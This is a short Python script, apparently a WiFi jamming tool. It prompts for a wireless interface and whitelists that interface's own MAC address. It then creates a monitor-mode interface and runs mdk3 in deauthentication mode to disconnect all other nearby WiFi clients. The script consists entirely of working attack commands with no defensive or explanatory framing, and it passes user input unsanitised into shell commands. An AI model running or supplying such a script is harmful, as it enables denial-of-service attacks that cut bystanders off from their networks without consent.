import os


# chose interface
os.system("iwconfig")
wlan = input("[+] Select an interface? : ")
os.system("clear")

# creating whitelist
file = open("files/whitelist.txt", "w")
mac = open("/sys/class/net/{}/address".format(wlan), "r")
file.write(mac.read())
mac.close()
file.close()
os.system("clear")

print("[+] Autodetect MAC Address ...")
os.system("cat /sys/class/net/{}/address".format(wlan))
print()

# making an adapter type monitor
os.system("sudo iw {} interface add mon0 type monitor".format(wlan))
# disconnecting WiFi
os.system("sudo mdk3 mon0 d -w files/whitelist.txt")
os.system("clear")